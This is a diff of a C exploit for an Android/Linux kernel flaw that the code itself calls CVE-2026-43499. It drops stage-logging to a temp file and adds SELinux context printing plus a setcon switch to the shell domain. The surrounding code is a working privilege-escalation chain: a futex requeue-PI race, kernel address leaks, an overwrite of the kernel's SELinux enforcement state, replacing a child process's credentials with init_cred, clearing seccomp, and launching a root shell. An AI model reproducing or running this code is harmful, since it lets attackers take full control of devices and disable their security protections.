@@ -24,6 +24,7 @@
 #include <ucontext.h>
 #include <unistd.h>
 #include <time.h>
+#include <selinux/selinux.h>
 
 // ================= Logging System =================
 #define COLOR_GREEN "\033[32m"
@@ -85,7 +86,6 @@ static uint64_t k_current_cred;
 static uint64_t k_y_task;
 static uint64_t k_waiter;
 static int __orig_stdout = -1;
-static int stage_fd = -1;
 static pid_t process_pid;
 static atomic_uintptr_t stamp_parent, stamp_value, stamp_lock;
 static atomic_int stamp_done, stamp_status;
@@ -98,6 +98,19 @@ static atomic_int respray_ready, respray_done;
 static atomic_uintptr_t respray_parent, respray_value, respray_lock;
 static unsigned fake_lock_index;
 static int y_leak_only;
+
+/* ---------- 新增：读取 /proc/self/attr/current 并打印 ---------- */
+static void log_context(const char *tag) {
+  char buf[256] = {0};
+  int f = open("/proc/self/attr/current", O_RDONLY | O_CLOEXEC);
+  if (f >= 0) {
+    ssize_t n = read(f, buf, sizeof(buf) - 1);
+    close(f);
+    if (n > 0) buf[n] = 0;
+  }
+  pr_info("%s: %s\n", tag, buf);
+}
+/* --------------------------------------------------------------- */
 
 static long raw_futex(volatile int *u1, long op, long val, long val2,
                       volatile int *u2, long val3) {
@@ -423,13 +436,6 @@ static void cpu_yield(void) {
   __asm__ volatile("yield" ::: "memory");
 }
 
-static void record_stage(char stage) {
-  if (stage_fd < 0) return;
-  ssize_t written = pwrite(stage_fd, &stage, 1, 0);
-  if (written != 1) return;
-  (void)fsync(stage_fd);
-}
-
 struct k_fpsimd_context {
   uint32_t magic, size, fpsr, fpcr;
   uint8_t vregs[32 * 16];
@@ -589,13 +595,12 @@ static int write_value(uint64_t target, uint64_t value) {
 int main(int argc, char **argv) {
   setvbuf(stdout, NULL, _IONBF, 0);
   __orig_stdout = dup(STDOUT_FILENO);
-  stage_fd = open("/data/local/tmp/ghostlock54.stage", O_WRONLY | O_CREAT | O_CLOEXEC, 0600);
-  record_stage('0');
   process_pid = getpid();
   
   timer_reset();
   pr_info("CVE-2026-43499 Exploit Engine Initiated\n");
   pr_info("Target PID: %d | UID: %d | GID: %d\n", getpid(), getuid(), getgid());
+  log_context("parent pre-exploit");
 
   struct sigaction sa;
   memset(&sa, 0, sizeof(sa));
@@ -612,7 +617,6 @@ int main(int argc, char **argv) {
   k_current_task = leak_task_from_status("/proc/self/status", &k_current_cred);
   if (!k_current_task) { pr_error("current task leak failed\n"); }
   
-  record_stage('1');
   uint64_t slide = runtime_text - LINK_TEXT;
   uint64_t data_delta = k_selinux_state - (runtime_text + OFF_SELINUX_STATE);
   k_init_task = runtime_text + OFF_INIT_TASK + data_delta;
@@ -649,10 +653,8 @@ int main(int argc, char **argv) {
   while (!(atomic_load(&x_locked_l1) && atomic_load(&y_parking) && atomic_load(&x_blocking))) sched_yield();
   
   usleep(30000);
-  record_stage('2');
   
   long r = raw_futex(&cond, CMP_REQUEUE_PI_PRIVATE, 1, 0, &pi1, 0);
-  record_stage('3');
   cond = 1;
   __atomic_thread_fence(__ATOMIC_SEQ_CST);
   syscall(SYS_tgkill, getpid(), atomic_load(&y_tid), SIGUSR1);
@@ -662,15 +664,12 @@ int main(int argc, char **argv) {
   }
   while (!atomic_load_explicit(&y_done, memory_order_acquire)) sched_yield();
   if (atomic_load(&y_done) < 0) {
-    record_stage('E');
     pr_error("sigreturn stamp failed\n");
   }
-  record_stage('4');
   TIMER("Deadlock detected, waiter armed");
   
   if (trigger_pi() != 0) { pr_error("settle trigger failed\n"); }
   usleep(15000);
-  record_stage('5');
   TIMER("Waiter settled into zero-BSS");
 
   uint64_t k_init_cred = runtime_text + OFF_INIT_CRED + data_delta;
@@ -715,6 +714,22 @@ int main(int argc, char **argv) {
         fclose(cf);
       }
     }
+
+    /* ---------- setcon 到 shell 域，单行展示切换 ---------- */
+    {
+      char pre[256] = {0}, post[256] = {0};
+      int f = open("/proc/self/attr/current", O_RDONLY | O_CLOEXEC);
+      if (f >= 0) { ssize_t n = read(f, pre, sizeof(pre) - 1); close(f); if (n > 0) pre[n] = 0; }
+      if (setcon("u:r:shell:s0") == 0) {
+        f = open("/proc/self/attr/current", O_RDONLY | O_CLOEXEC);
+        if (f >= 0) { ssize_t n = read(f, post, sizeof(post) - 1); close(f); if (n > 0) post[n] = 0; }
+        pr_success("[CHILD] context: %s -> %s\n", pre, post);
+      } else {
+        pr_warning("[CHILD] setcon failed: %s (errno=%d)\n", strerror(errno), errno);
+      }
+    }
+    /* ----------------------------------------------------------- */
+
     pr_success("[CHILD] Running root action. Launching shell...\n");
     
     dup2(__orig_stdout, STDOUT_FILENO);
@@ -735,31 +750,25 @@ int main(int argc, char **argv) {
   uint64_t child_cred = pair[1];
   
   pr_info("Child PID: %d | Task: 0x%016llx | Cred: 0x%016llx\n", (int)child_pid, (unsigned long long)child_task, (unsigned long long)child_cred);
-  record_stage('7');
 
   int before = read_enforce();
   int wr = write_value(k_selinux_state, k_write_value);
   usleep(50000);
   int after = read_enforce();
   pr_success("SELinux write_trigger=%d enforce=%d->%d\n", wr, before, after);
-  record_stage('6');
 
   if (!write_value(child_task + 0x808, k_init_cred)) { pr_error("child cred -> init_cred failed\n"); }
-  record_stage('8');
   pr_success("Child task->cred -> init_cred\n");
 
   if (!write_value(child_task + 0x800, k_init_cred)) { pr_error("child real_cred -> init_cred failed\n"); }
-  record_stage('9');
   pr_success("Child task->real_cred -> init_cred\n");
 
   if (!write_value(k_init_cred + 0x04, 0)) { pr_error("init_cred uid/gid repair failed\n"); }
-  record_stage('s');
   pr_success("init_cred uid/gid repaired to 0\n");
 
   if (!write_value(child_task + OFF_TASK_SECCOMP, 0)) {
     pr_error("child seccomp clear failed\n");
   }
-  record_stage('f');
   pr_success("Child seccomp mode disabled (task+0x%x)\n", (unsigned)OFF_TASK_SECCOMP);
 
   TIMER("Exploit complete, waking child shell");
